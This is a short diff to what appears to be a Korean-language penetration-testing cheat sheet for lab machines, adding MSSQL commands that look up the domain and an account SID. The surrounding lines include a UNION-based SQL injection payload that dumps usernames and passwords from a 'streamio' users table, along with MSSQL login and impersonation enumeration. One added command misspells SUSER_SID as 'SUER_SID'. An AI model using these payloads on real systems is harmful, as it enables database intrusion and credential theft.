@@ -275,16 +275,21 @@ select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,90157825
 SELECT 1,CONCAT(username,':',password),3,4,5,6 from streamio..users;-- -
 ```
 
-### MSSQL 내부 명령
+### MSSQL 명령
 ```mssql
 # MSSQL에 로그인 가능한 유저 확인
 enum_logins
 
 # IMPERSONATE 권한 확인
 enum_impersonate
+
+# 도메인 확인
+select default_domain();
+
+# SID 확인
+select SUER_SID('signed\administrator');
 ```
 
----
 ### xp_dirtree
 ```mssql
 -- 내부 폴더 탐색 가능.
